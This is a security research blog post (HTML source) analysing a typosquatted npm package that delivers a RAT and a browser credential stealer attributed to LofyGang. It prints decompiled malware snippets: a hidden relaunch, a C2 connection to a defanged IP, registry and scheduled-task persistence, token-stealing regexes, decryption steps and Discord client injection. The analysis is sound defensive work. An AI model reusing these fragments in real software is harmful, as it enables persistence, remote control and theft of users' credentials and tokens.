@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html data-html-server-rendered="true" lang="en" data-vue-tag="%7B%22lang%22:%7B%22ssr%22:%22en%22%7D%7D">
+  <head>
+    <title>LofyGang Returns: From Fake undici to Full System Compromise via Parallel Data Theft - JFrog Security Research</title><meta name="gridsome:hash" content="c50253bde8d831f77f875cad9d000579dc8bb41f"><meta data-vue-tag="ssr" charset="utf-8"><meta data-vue-tag="ssr" name="generator" content="Gridsome v0.7.23"><meta data-vue-tag="ssr" data-key="viewport" name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"><meta data-vue-tag="ssr" data-key="format-detection" name="format-detection" content="telephone=no"><meta data-vue-tag="ssr" name="referrer" content="origin"><meta data-vue-tag="ssr" http-equiv="Content-Security-Policy" content="default-src *  &#x27;self&#x27; &#x27;unsafe-eval&#x27; &#x27;unsafe-inline&#x27;  https://jfrog.com; img-src &#x27;self&#x27; * data: ; font-src &#x27;self&#x27; * data: ;"><meta data-vue-tag="ssr" name="title" content="LofyGang Returns: From Fake undici to Full System Compromise via Parallel Data Theft | JFrog"><meta data-vue-tag="ssr" name="description" content="The JFrog Security research team identified a malicious npm package undicy-http (version 2.0.0) masquerading as the popular undici HTTP client library. Despite its name, the package contains zero HTTP client functionality."><link data-vue-tag="ssr" rel="icon" href="data:,"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="16x16" href="/assets/static/favicon.ce0531f.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="32x32" href="/assets/static/favicon.ac8d93a.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="96x96" href="/assets/static/favicon.b9532cc.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="76x76" href="/assets/static/favicon.f22e9f3.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="152x152" href="/assets/static/favicon.62d22cb.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="120x120" href="/assets/static/favicon.1539b60.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="167x167" href="/assets/static/favicon.dc0cdc5.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="180x180" href="/assets/static/favicon.7b22250.ebe1c983be3d8af04d6186b36f13b87c.png"><link rel="preload" href="/assets/css/0.styles.ab306386.css" as="style"><link rel="preload" href="/assets/js/app.4e943a10.js" as="script"><link rel="preload" href="/assets/js/page--src--templates--real-time-post-vue.9720118d.js" as="script"><link rel="prefetch" href="/assets/js/page--src--pages--404-vue.9f141ac9.js"><link rel="prefetch" href="/assets/js/page--src--pages--index-vue.3bd4585a.js"><link rel="prefetch" href="/assets/js/page--src--pages--index-vue~page--src--pages--malicious-packages-vue.9ad923e0.js"><link rel="prefetch" href="/assets/js/page--src--pages--malicious-packages-vue.20041e6d.js"><link rel="prefetch" href="/assets/js/page--src--pages--model-threats-vue.03b8946c.js"><link rel="prefetch" href="/assets/js/page--src--pages--oss-vue.8664726d.js"><link rel="prefetch" href="/assets/js/page--src--pages--post-vue.6bfd8a26.js"><link rel="prefetch" href="/assets/js/page--src--pages--vulnerabilities-vue.37dba8ee.js"><link rel="prefetch" href="/assets/js/page--src--templates--model-threats-post-vue.70bb558a.js"><link rel="prefetch" href="/assets/js/page--src--templates--post-vue.d2ee2512.js"><link rel="prefetch" href="/assets/js/vendors~page--src--pages--index-vue.2ec3d7ff.js"><link rel="prefetch" href="/assets/js/vendors~page--src--templates--model-threats-post-vue~page--src--templates--real-time-post-vue.7f393094.js"><link rel="prefetch" href="/assets/js/vendors~page--src--templates--real-time-post-vue.07e667fb.js"><link rel="stylesheet" href="/assets/css/0.styles.ab306386.css"><script data-vue-tag="ssr" src="/speedsize-local.js"></script><script data-vue-tag="ssr" src="https://transcend-cdn.com/cm/f0071674-c641-4cf3-9d31-303ec0c86b1b/airgap.js" data-languages="en" data-tracker-overrides="GoogleConsentMode:security_storage=on;ad_storage=SaleOfInfo,Advertising;ad_user_data=SaleOfInfo,Advertising;ad_personalization=SaleOfInfo,Advertising;analytics_storage=Analytics,SaleOfInfo;functionality_storage=Functional,SaleOfInfo;personalization_storage=Functional,SaleOfInfo" data-cfasync="false" type="text/javascript" charset="utf-8"></script><script data-vue-tag="ssr" type="text/javascript" charset="utf-8">
+      window.dataLayer = window.dataLayer || [];
+      function gtag() {
+        dataLayer.push(arguments);
+      }
+      gtag("js", new Date());
+      gtag("config", "GTM-T6MF8M");
+      gtag('set', 'developer_id.dODQ2Mj', true);
+    </script><noscript data-vue-tag="ssr"><style>.g-image--loading{display:none;}</style></noscript>
+  </head>
+  <body >
+    <div data-server-rendered="true" id="app" class="layout"><header class="py-2 main-header"><div class="container mx-auto px-2"><div class="flex w-full justify-between items-center"><div class="left"><div class="flex items-center gap-2"><a href="/" class="logo active"><img alt="JFrog Security Research" src="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg" width="40" srcset="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg 40w" sizes="(max-width: 40px) 100vw, 40px" class="g-image"></a><span class="site-name small">JFrog Security Research</span></div></div><div class="right"><div class="hidden sm:block desktop-menu-wrapper"><ul class="top-menu flex items-center"><li class="menu-item"><a href="/model-threats/" class="font-bold px-3">
+      Model Threats
+    </a><a href="/vulnerabilities/" class="font-bold px-3 mx-3">
+      Discover
+    </a></li><li><a href="https://twitter.com/JFrogSecurity" target="_blank" rel="noreferrer noopener noreferrer" class="sr-button px-3 py-2 inline-flex gap-2">
+  Follow JFrog Security
+  <img alt="twitter" src="/assets/static/twitter.e0519be.9769aec62433fd58c76ad32c2d613842.svg" width="14" srcset="/assets/static/twitter.e0519be.9769aec62433fd58c76ad32c2d613842.svg 14w" sizes="(max-width: 14px) 100vw, 14px" class="g-image"></a></li></ul></div><div class="sm:hidden flex item-center mobile-menu-wrapper gap-2"><!----><button class="show-menu-hamburger px-1"><img alt="Menu" src="/assets/static/hamburger.a58a0fd.dc5087fee70346d455e75c87bc430716.svg" width="22" srcset="/assets/static/hamburger.a58a0fd.dc5087fee70346d455e75c87bc430716.svg 22w" sizes="(max-width: 22px) 100vw, 22px" class="g-image"></button></div></div></div></div><div class="fixed mobile-menu h-screen w-screen z-50 bg-white text-gray-700 p-5 inset-0" style="display:none;"><div class="flex justify-end mb-3"><button class="p-3"><img alt="Menu" src="data:image/svg+xml,%3csvg fill='none' viewBox='0 0 12 12' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3e%3cdefs%3e%3cfilter id='__svg-blur-ed66a5bf1eb83ec14d27c7d6a4278d79'%3e%3cfeGaussianBlur in='SourceGraphic' stdDeviation='40'/%3e%3c/filter%3e%3c/defs%3e%3cimage x='0' y='0' filter='url(%23__svg-blur-ed66a5bf1eb83ec14d27c7d6a4278d79)' width='12' height='12' xlink:href='data:image/svg%2bxml%3bbase64%2ciVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAACXBIWXMAAAsTAAALEwEAmpwYAAAJfklEQVR42u2bCWwVVRSGpwtQWpa2UFpkEWRvUQFBNEqkFMoiIogKFWsFKiAYTTBRoiwulD0KERLBoKAiZRN3UCEiUUBFRWURBFxABCn70va1FM99fhOuw8xjmzd9yXOSP236%2bmbO%2bp9zz71jGOdf8YIWgk6CewU5gvsEPQRtBfUFVQUVjNC6KiBXfeTsgdw56NEJveIvdKNqgmaCdME9gmxBf0E3QRtBXUGcICrEDBCFXHWRsxtyZ6NHOnpVu9CNEgSpgs7cYKDgfkFPQXtBQ6xYSRAZIspHIk888rVH3vuRvz/6pKKf4xUjqCNoJ7hTkCt4VDBcMEDQVdBa0EBQS1BdUJnwiywHpSvw/OrI0wD5uiLvcOTPRZ926BdjzXl1g0Q%2bbCW4XTBUMEYwSZAnGCUYIugj6EiYNRGkkHvRHhsgmuemIEcb5OqDnKOQexJ6DEWvVuiZiN5%2bYmguSMNC6p%2bG8eVXBYsFiwSvCV4UPC14WNAPYmkpSBZU9NgAlVC%2bJXL0Qy4l3wvIuwj556LPMPRrh75KbyMDgugi6I2lJggWCNYIvhN8L9gg%2bESQL5gpGCcYzPcbQ0BeXlXwfAZyjEOufORcj9xK/s/QJw/9eqOv0ttvOVUmsgQPCcbieaX8TkGB4KjgoOA3wSbBKsGbgufINWXRJEGEh/mfxHMHIMebyLUJOQ8idwF6rEGvseiZRXUwHhQ8IBgkeEwwWbAEy6kvn9Xg4287BJ8TWo8LuguaklPRHuR%2bdZ7XnefPRZ4dyOezyF2APkvQ7zH0VXr7m4Us6uVwwn8x4XPUciOFUqy7RfC%2bYBoWzSCv6kCslV1slqI1tr%2bKctYJdp%2bGHFuQq9RG5mNExmL0G4G%2bSm9/x6SahjsIp1EQyAZueNYGhYK9gq8gmkkQkGLgWyAXRVCxLhkghjKnvH4zJc3kqnzk2ItcdvIe4n/mCZ6iP%2bhFBPnbxjY0D5l4U7Hox%2bSSz%2baGZ4iO3YJ1gmUQ0NM0Hp2pLoku8YIZ8ul4TjlpBiH9BTl%2bBLnsZN0DP8ygEnTDkEp3f%2b9cR2si%2bqDIQtJARUGJzY2LBIcFv2vEuACvKCN0ENRzoTyqFrc2Aivln8WTKwUbcUIB8th5XznqJ4ylCPBuFG%2bE7v5yEouVrxbchpVeEnwq2I4RTlvyq4zoOMXnO4mGBTQefQXXEgWXS4wRyNWCkB2F8orwtgn%2bEhwXFNt4v5io2EUFeFnwCNxxDXJVNQkmEk8lEQX3Yq03%2bPJmwugIeWZ9WAmfKSOsFsziYZkIn8IiJIbnRQRQOApZVF9Rk1qfTs5PF6xA%2bYPIUmZxSjFGUcb5WfAlPPE8hN8OeSpbHROBkI154CDC7RXBe5Ci2RcU24RaCUL9IFgumEokKXK9iRxOIeIiAxggFkc0IlS70eiY1WkjyhU6yKAc8Sv/t4KImUB73IUVYbxTVMYgZBqhoiw2EmUWQji7sXCZjQAqHf6AcZfhsSept525b1KAlIgkNJvR12dpz8/Xnn8swPN/x1lLad2f4PkqGq%2bjjMY6RaE5VEgmEnQP5F2CB1T1%2bBaims93c4mshoSf3VURYurAIOMZIvD9i4hAHxGoCPltwRTSpicR2AwyrRaImCPxjl0ODsGjKy8yB/dDoGYOPsu6vDX3jXKYRl0LgY4WvK5x0N4AHOTTOGgVHDSCkG%2bOQ6sS4Ze0dL9cFjYNcRgWVv8/hxY0E2/UwsiViIhE8j6dpmomyigi%2b9uhCpU4VCFlvLtYKSZc6fTqYuuwU0ocwoPv0IfnMrBoj7dbwA03wDsqX8dTt1UfcsChxptl7g%2bI19qH3Mp4zJV23K4Tmw4n6J1YqUPbvEfzzkRtMZJFye2H4sNZ2SneWAubn7S5ZxmR9xvcsJywH23pRBPcWoFZe/Fell58Azl62mHxdBg%2bWItnZ8PQk7nHRJhehf1b9BJbCW2fg/f3Q7RLIbwRhP2tWu/h1lrET4wxREJtHpBOdZgKS28mV4tsvFXIZ2q5%2bg0DCrXW%2bIAeQ%2bFDOs91KP8X%2bW3XdJkGXUEkDoPwWhL2CSgflNF9FIZoQokcSalaA2EdIGx9mvClKFNAzv4CiW6mT/%2bR37fBKeoeJ7Q1SBn3KIRTdlFd5lHne8L2CV7tV0RQytqSx89QslZBXL%2bi7CmUOMPP09p06QBhrDy9D%2bxHwROaAU3FD8Mlm6kqC%2bkvsiHUZK/3KuIoWx1pWkZDREvJdTOMTWVK%2bFmIYU6CExCaiVOkUYlW5v4m5NdRTWZTjcyZZBNzYePlZS6emtO59YXFx8PiJpGZKVGMAYq1333a34owTpH299OWEdwChi%2bPUjk6Mh1Kpp/wfCsqlgamPjU9nWh4DjZfTzoc0jzr09KiTEOpxSCFpMseiHMJFWMwhNeKGUZNotHrfQk/D0RoS%2bl4UiKDSJgFq28jt4%2bjlM%2bhXzDJsgQDnLJMdGdrnaQqxzWoTFHIEGGEwJVIR5dNefwAlt%2bHAYoCKK%2bPsPQWdztz/uk0T%2b1JvVDZlzyvYUqlu1MM/S5t6p8sYYsd5nZ2kWCSn4qgjzDoAJa0cUaIXhVY6PSFDN9heaoboOwSDbCVJmkyq8k06%2bZmOEZAlVA1gFccUMsIgQMaXlcBc57QlTSrqQ02y6UKlEcfMJE%2bIJPJUkMqQpXy6AO87gTX0glOphPsj8HT6AQ9J0av1wI7tLXAHNYCuQw/mhoXcfgplFaDBS6sBvOpNA8w9U3xKg1CaR4wn32HO7TN2IrBIMRgTIRWujARWqlNhDIh4noYwtWJkFszwc8ZpLo5E1zGd0dAxB2CMRN0cyo8ARYfaJw7p3MlU%2bGvtKnwGJqlLoaL5xPc3BeYpNXxGxliNrfsC%2bRc5r7Aas3AgwyXzie4uTM0G893IZqSCNGKQdgZuuzzCcHaG1xI5PSjg6vhsJ53Y29wtWVv0Ho%2bIeDeoNu7w%2bb%2bfB736Ej7GhPE3WHzfMIU47/nE5qxNV49UFq4dT7A3J%2bfztw%2bm0VSKlHl1fkA83xCDrxzvfHveag4uyhw%2b4SI6QHzmH0TIivO8PaEyHzj3AmRTMsGSoRhuH9GKND%2bfCWjfM8Imcd6a%2buNUjBOibm1Px%2bMU2IZRFcNcwHl9jnBPMPd/flgnRNsjMOv%2bKToesP5pKhb%2b/NunxTtbmgnRa/krPDXhvNZ4WQj9M4KK0J8CiP2Qvf/T4uH/fsC4fLGyGfoNcawvDES9u8Mhf1bY%2bHy3uAQw%2bG9QWu5Cbs3R61XWL87bBhh9vb4P/%2bX4wkCBpt7AAAAAElFTkSuQmCC' /%3e%3c/svg%3e" width="12" data-src="/assets/static/close.5cd2673.91b568c73f917f773ea7915d69802829.svg" data-srcset="/assets/static/close.5cd2673.91b568c73f917f773ea7915d69802829.svg 12w" data-sizes="(max-width: 12px) 100vw, 12px" class="g-image g-image--lazy g-image--loading"><noscript><img src="/assets/static/close.5cd2673.91b568c73f917f773ea7915d69802829.svg" class="g-image g-image--loaded" width="12" alt="Menu"></noscript></button></div><ul class="mobile-menu-list"><li class="py-4 px-2 border-t border-gray-200"><a href="/" class="text-gray-700 active">
+        Home
+      </a></li><li class="py-4 px-2 border-t border-gray-200"><a href="/model-threats/" class="text-gray-700">
+        Model Threats
+      </a></li><li class="py-4 px-2 border-t border-gray-200"><a href="/vulnerabilities/" class="text-gray-700">
+        Discover
+      </a></li><li class="py-4 px-2 border-t border-gray-200"><a href="https://twitter.com/JFrogSecurity" target="_blank" rel="noopener" class="text-gray-700">
+        Follow JFrog Security
+      </a></li></ul></div></header><div class="latest-posts"><div class="container pt-5 pb-10"><h1 class="mt-3 pb-0">LofyGang Returns: From Fake undici to Full System Compromise via Parallel Data Theft</h1><p class="mt-1 mb-5 green">Meitar Palas, JFrog Security Researcher | 31 Mar, 2026</p><div class="post-content-wrapper real-time-theme"><section class="latest-posts-single-post-content text-black"><p>The JFrog Security research team identified a malicious npm package <code>undicy-http</code> (version 2.0.0) masquerading as the popular <code>undici</code> HTTP client library. Despite its name, the package contains zero HTTP client functionality. Instead, it delivers a <strong>dual-payload attack</strong>: a Node.js-based Remote Access Trojan (RAT) with live screen streaming, and a <strong>native Windows PE binary</strong> that uses direct syscalls to inject into browser processes and steal credentials, cookies, credit cards, IBANs, and session tokens from <strong>50+ browsers</strong> and <strong>90+ cryptocurrency wallet extensions</strong>.</p>
+<p>The most significant finding is the native second-stage payload (<code>chromelevator.exe</code>), a compiled x86-64 Windows executable that performs <strong>process hollowing via direct syscalls</strong>, allocating memory, writing shellcode, and creating remote threads without calling the standard <code>ntdll.dll</code> APIs. This technique bypasses user-mode hooks from EDR and antivirus products. The injector communicates with its injected payload through named pipes, decrypts an AES-encrypted internal payload at runtime, and exfiltrates stolen data through both a Discord webhook and a Telegram bot. The Node.js layer independently operates as a full RAT with remote shell, screen capture, webcam/microphone streaming, file upload, and persistence capabilities, all controlled through a WebSocket C2 panel.<br>
+The binary also matches the YARA rule <code>MAL_Browser_Stealer_Dec25_2</code>, authored by X__Junior and published through Nextron Systems' <a href="https://valhalla.nextron-systems.com/info/rule/MAL_Browser_Stealer_Dec25_2" target="_blank" rel="nofollow noopener noreferrer">VALHALLA rule feed</a>. The rule is described as detecting "a loader that loads a browser stealer part of GlassWorm Campaign," a broader supply chain attack framework <a href="https://www.malwarebytes.com/blog/news/2026/03/glassworm-attack-installs-fake-browser-extension-for-surveillance" target="_blank" rel="nofollow noopener noreferrer">documented by Malwarebytes</a> and others that targets developers through compromised packages across npm, PyPI, and GitHub. The rule has matched over 1,750 malicious samples since its creation in December 2025, with new matches appearing daily through March 2026, indicating an active and prolific campaign. This suggests <code>chromelevator.exe</code> is not unique to LofyGang but rather a component of the broader GlassWorm campaign, reused here alongside LofyGang's own npm typosquatting infrastructure and exfiltration channels.</p>
+<p>This package represents a major escalation from previously documented LofyGang campaigns, which relied exclusively on JavaScript payloads for Discord token theft and credit card harvesting. The addition of a native binary with syscall-level process injection, combined with a multi-channel exfiltration architecture (Discord, Telegram, gofile.io, catbox.moe) and an extensive target list spanning gaming, social media, and cryptocurrency platforms, makes this one of the most comprehensive npm supply chain payloads observed from this threat actor.</p>
+<h2 id="infrastructure-summary"><a href="#infrastructure-summary" aria-hidden="true" tabindex="-1">Infrastructure Summary</a></h2>
+<table>
+<thead>
+<tr>
+<th align="left">IP / Domain</th>
+<th align="left">Role</th>
+<th align="left">Hosting</th>
+<th align="left">ASN</th>
+<th align="left">Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left"><code>24[.]152[.]36[.]243:3000</code></td>
+<td align="left">WebSocket C2 (RAT panel)</td>
+<td align="left">Master da Web Datacenter LTDA (Brazil)</td>
+<td align="left">AS270564</td>
+<td align="left">N/A</td>
+</tr>
+<tr>
+<td align="left"><code>amoboobs[.]com</code></td>
+<td align="left">Native payload delivery (<code>chromelevator.exe</code>)</td>
+<td align="left">Cloudflare (172[.]67[.]173[.]92)</td>
+<td align="left">AS13335</td>
+<td align="left">Live</td>
+</tr>
+<tr>
+<td align="left"><code>ptb[.]discord[.]com</code></td>
+<td align="left">Exfiltration via webhook</td>
+<td align="left">Discord</td>
+<td align="left">N/A</td>
+<td align="left">Live</td>
+</tr>
+<tr>
+<td align="left"><code>api[.]telegram[.]org</code></td>
+<td align="left">Exfiltration via bot API</td>
+<td align="left">Telegram</td>
+<td align="left">N/A</td>
+<td align="left">Live</td>
+</tr>
+<tr>
+<td align="left"><code>gofile[.]io</code> / <code>catbox[.]moe</code></td>
+<td align="left">Bulk file upload (archives)</td>
+<td align="left">Various</td>
+<td align="left">N/A</td>
+<td align="left">Live</td>
+</tr>
+<tr>
+<td align="left"><code>ipinfo[.]io</code> / <code>myexternalip[.]com</code></td>
+<td align="left">Victim IP geolocation</td>
+<td align="left">Various</td>
+<td align="left">N/A</td>
+<td align="left">Live</td>
+</tr>
+</tbody>
+</table>
+<h2 id="package-delivery"><a href="#package-delivery" aria-hidden="true" tabindex="-1">Package Delivery</a></h2>
+<p>The package uses a straightforward typosquatting strategy, impersonating <code>undici</code>, the official HTTP/1.1 and HTTP/2 client bundled with Node.js.</p>
+<pre><code class="language-json">{
+  "name": "undicy-http",
+  "bin": "index.js",
+  "version": "2.0.0",
+  "author": "ConsoleLofy",
+  "dependencies": {
+    "@primno/dpapi": "^2.0.1",
+    "adm-zip": "^0.5.16",
+    "archiver": "^7.0.1",
+    "axios": "^1.9.0",
+    "koffi": "^2.15.2",
+    "rcedit": "^4.0.1",
+    "screenshot-desktop": "^1.15.3",
+    "sqlite3": "^5.1.7",
+    "ws": "^8.18.2"
+  },
+  "pkg": {
+    "targets": ["node20-win-x64"]
+  }
+}
+</code></pre>
+<p>The dependency list is a clear signal of malicious intent:</p>
+<ul>
+<li><code>@primno/dpapi</code>: Windows DPAPI decryption of browser master keys  </li>
+<li><code>sqlite3</code>: Reading Chromium <code>Login Data</code> and <code>Cookies</code> databases  </li>
+<li><code>koffi</code>: Native FFI calls to Windows APIs  </li>
+<li><code>screenshot-desktop</code>: Screen capture for the RAT  </li>
+<li><code>ws</code>: WebSocket connection to C2 server  </li>
+<li><code>archiver</code> / <code>adm-zip</code>: Archiving stolen data before exfiltration  </li>
+<li><code>rcedit</code>: Modifying PE resource metadata  </li>
+<li><code>@yao-pkg/pkg</code> (dev): Compiling the Node.js payload into a standalone <code>.exe</code></li>
+</ul>
+<p>The author field <code>ConsoleLofy</code> contains the keyword <code>Lofy</code>, matching the closed dictionary of aliases used by the <strong>LofyGang</strong> threat group (documented by <a href="https://checkmarx.com/blog/lofygang-software-supply-chain-attackers-organized-persistent-and-operating-for-over-a-year/" target="_blank" rel="nofollow noopener noreferrer">Checkmarx in October 2022</a>). The code itself confirms attribution with hardcoded strings <code>"Lofygang"</code>, <code>"t.me/lofygang"</code>, and Discord embed author names like <code>"Lofygang (Roblox Session)"</code>.</p>
+<p>There is no <code>postinstall</code> or <code>preinstall</code> trigger. The <code>bin</code> field points directly to <code>index.js</code>, meaning the payload executes when the package binary is invoked.</p>
+<h2 id="entry-point-hidden-execution-via-vbscript"><a href="#entry-point-hidden-execution-via-vbscript" aria-hidden="true" tabindex="-1">Entry Point: Hidden Execution via VBScript</a></h2>
+<p>The very first thing <code>index.js</code> does upon execution is check if it's already running hidden. If not, it creates a VBScript file to re-launch itself as a windowless process:</p>
+<pre><code class="language-javascript">if (!process.env._NYX_HIDDEN) {
+    const var_18 = path.join(os.tmpdir(), "_nyx_launch.vbs");
+    const var_22 = "Set objShell = CreateObject(\"WScript.Shell\")\r\n"
+        + "Set objEnv = objShell.Environment(\"Process\")\r\n"
+        + "objEnv(\"_NYX_HIDDEN\") = \"1\"\r\n"
+        + "objShell.Run \"\"\"" + process.execPath + "\"\" " + args + "\", 0, False\r\n";
+    fs.writeFileSync(var_18, var_22);
+    child_process.spawn("wscript.exe", [var_18], { detached: true, stdio: "ignore" }).unref();
+    process.exit(0);
+}
+</code></pre>
+<p>The <code>0</code> parameter to <code>objShell.Run</code> sets the window style to hidden. The environment variable <code>_NYX_HIDDEN</code> prevents an infinite re-launch loop.</p>
+<h2 id="rat-component"><a href="#rat-component" aria-hidden="true" tabindex="-1"><strong>RAT Component</strong></a></h2>
+<p>After the hidden re-launch, the payload connects to a WebSocket C2 server at <code>ws://24[.]152[.]36[.]243:3000</code> and registers as a client:</p>
+<pre><code class="language-javascript">const var_53 = process.env.SERVER_URL || "ws[:]//24[.]152[.]36[.]243:3000";
+const var_68 = var_53 + "/?role=client&#x26;name=" + encodeURIComponent(hostname)
+    + "&#x26;monitors=" + displays.length;
+</code></pre>
+<p>The C2 connection supports the following remote commands:</p>
+<ul>
+<li><code>exec</code>: Remote shell execution (arbitrary commands)  </li>
+<li><code>select</code>: Switch between victim's monitors  </li>
+<li><code>upload</code>: Upload files to the victim's machine  </li>
+<li><code>action</code>: Enable/disable screen streaming  </li>
+<li><code>mic_start</code> / <code>mic_stop</code>: Record victim's microphone  </li>
+<li><code>webcam_list</code> / <code>webcam_start</code> / <code>webcam_stop</code>: Enumerate and stream webcam  </li>
+<li><code>talk_start</code> / <code>talk_audio</code> / <code>talk_stop</code>: Play audio through victim's speakers</li>
+</ul>
+<p>Screen capture is implemented using <code>screenshot-desktop</code> and resized via PowerShell's <code>System.Drawing</code> API before streaming over WebSocket. The RAT labels itself <code>"ScreenLiveClient"</code> and prints Portuguese status messages (<code>"Conectado ao servidor"</code>, <code>"monitor(es) detectado(s)"</code>), consistent with LofyGang's Brazilian origin.</p>
+<h2 id="persistence"><a href="#persistence" aria-hidden="true" tabindex="-1">Persistence</a></h2>
+<p>The malware establishes persistence through three mechanisms in sequence, falling back if one fails:</p>
+<ol>
+<li><strong>Scheduled Task</strong>: Runs at logon with highest privileges:</li>
+</ol>
+<pre><code class="language-javascript">execSync('schtasks /Create /TN "ScreenLiveClient" /TR "wscript.exe \\"'
+    + vbsPath + '\\"" /SC ONLOGON /RL HIGHEST /F');
+</code></pre>
+<ol start="2">
+<li><strong>Registry Run Key</strong>: Fallback if <code>schtasks</code> fails:</li>
+</ol>
+<pre><code class="language-javascript">execSync('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"'
+    + ' /v "ScreenLiveClient" /t REG_SZ /d "wscript.exe \\"' + vbsPath + '\\"" /f');
+</code></pre>
+<ol start="3">
+<li><strong>Startup Folder</strong>: Copies the executable to the Windows Startup directory.</li>
+</ol>
+<p>The VBScript launcher (<code>%TEMP%\svchost.vbs</code>) is marked hidden via <code>attrib +h +s</code> to avoid casual discovery.</p>
+<h2 id="anti-analysis"><a href="#anti-analysis" aria-hidden="true" tabindex="-1">Anti-Analysis</a></h2>
+<h3 id="anti-vm--sandbox-detection"><a href="#anti-vm--sandbox-detection" aria-hidden="true" tabindex="-1">Anti-VM / Sandbox Detection</a></h3>
+<p>The malware implements a comprehensive <code>AntiVM</code> class with <strong>10 distinct checks</strong>:</p>
+<ul>
+<li><strong>MAC Address</strong>: Flags VM vendor prefixes (VMware, VirtualBox, Hyper-V, QEMU, Xen, Parallels)  </li>
+<li><strong>BIOS</strong>: Scans <code>wmic bios get serialnumber,version</code> for VM identifiers  </li>
+<li><strong>Disk</strong>: Checks <code>wmic diskdrive</code> for virtual disk names (VBOX, VMWARE, QEMU)  </li>
+<li><strong>Processes</strong>: Scans running processes for analysis tools (Wireshark, Procmon, x64dbg, IDA, Ghidra, Fiddler, Cuckoo, ANY.RUN, Triage, etc.)  </li>
+<li><strong>Username</strong>: Flags common sandbox usernames (<code>sandbox</code>, <code>malware</code>, <code>virus</code>, <code>sample</code>, <code>test</code>, <code>admin</code>)  </li>
+<li><strong>Recent files</strong>: Checks for analysis-related recent files  </li>
+<li><strong>Desktop files</strong>: Scans desktop for VM/analysis indicators  </li>
+<li><strong>Registry</strong>: Probes for VirtualBox Guest Additions, VMware Tools, and Hyper-V keys  </li>
+<li><strong>Running services</strong>: Checks for <code>vmtoolsd</code>, <code>vboxservice</code>, <code>sandboxie</code> services  </li>
+<li><strong>System paths</strong>: Looks for <code>C:\analysis</code>, <code>C:\sandbox</code>, <code>C:\tools</code>, <code>C:\program files\oracle\virtualbox guest additions</code>, <code>C:\program files\VMware</code></li>
+</ul>
+<h3 id="fake-dll-error"><a href="#fake-dll-error" aria-hidden="true" tabindex="-1">Fake DLL Error</a></h3>
+<p>After anti-VM checks pass, the malware displays a fake Windows error dialog via VBScript to deceive the user:</p>
+<pre><code class="language-javascript">const var_1229 = ["MSVCR100.dll", "MSVCP140.dll", "VCRUNTIME140.dll",
+    "api-ms-win-crt-runtime-l1-1-0.dll", "ucrtbase.dll"][Math.floor(Math.random() * 5)];
+const var_1230 = 'WshShell.Popup "The program can\'t start because '
+    + var_1229 + ' is missing from your computer.", 0, "System Error", 16';
+</code></pre>
+<p>This makes the victim believe the program failed to run, when in reality the payload is executing silently in the background.</p>
+<h3 id="anti-debugging"><a href="#anti-debugging" aria-hidden="true" tabindex="-1">Anti-Debugging</a></h3>
+<p>The entry point contains a self-invoking function that uses regex matching and <code>debugger</code> statements to stall analysis tools:</p>
+<pre><code class="language-javascript">const var_11 = new RegExp("function *\\( *\\)");
+const var_12 = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i");
+// If deobfuscation detected, enter infinite loop
+if (!var_11.test(var_13 + "chain") || !var_12.test(var_13 + "input")) {
+    var_13("0"); // -> while(true){}
+}
+</code></pre>
+<h2 id="data-theft"><a href="#data-theft" aria-hidden="true" tabindex="-1"><strong>Data Theft</strong></a></h2>
+<h3 id="discord-token-theft"><a href="#discord-token-theft" aria-hidden="true" tabindex="-1">Discord Token Theft</a></h3>
+<p>Targets <strong>4 Discord variants</strong> (Stable, Canary, PTB, Development) and <strong>50+ browsers</strong> by scanning <code>Local Storage/leveldb</code> for token patterns:</p>
+<pre><code class="language-javascript">const var_205 = [
+    new RegExp(/mfa\.[\w-]{84}/g),           // MFA tokens
+    new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)  // Standard tokens
+];
+</code></pre>
+<p>For Discord installations with encrypted tokens (prefix <code>dQw4w9WgXcQ:</code>), the malware:</p>
+<ol>
+<li>Reads <code>Local State</code> to extract the encrypted AES master key  </li>
+<li>Decrypts it via Windows DPAPI (using <code>@primno/dpapi</code> or a PowerShell fallback)  </li>
+<li>Uses AES-256-GCM to decrypt the token</li>
+</ol>
+<p>For each stolen token, the malware queries the Discord API (<code>/api/v10/users/{id}/profile</code>, <code>/api/v9/users/@me/billing/payment-sources</code>) to enrich the exfiltrated data with badges, billing info, Nitro status, and "HQ friends" (accounts with rare badges).</p>
+<h3 id="discord-client-injection"><a href="#discord-client-injection" aria-hidden="true" tabindex="-1">Discord Client Injection</a></h3>
+<p>The malware overwrites <code>discord_desktop_core/index.js</code> in all installed Discord variants with remotely fetched injection code, replacing the <code>%WEBHOOK_REPLACE_NYX%</code> placeholder with the attacker's exfiltration endpoint:</p>
+<pre><code class="language-javascript">var_370 = var_370.replace(/%WEBHOOK_REPLACE_NYX%/g, var_371);
+fs.writeFileSync(var_367, arg_164, "utf8");
+// [Injection] Injected: %LOCALAPPDATA%\Discord\app-X.X.X\modules\
+//     discord_desktop_core-X\discord_desktop_core\index.js
+</code></pre>
+<p>After injection, Discord processes are killed and relaunched via <code>Update.exe --processStart</code>, ensuring the injected code runs immediately.</p>
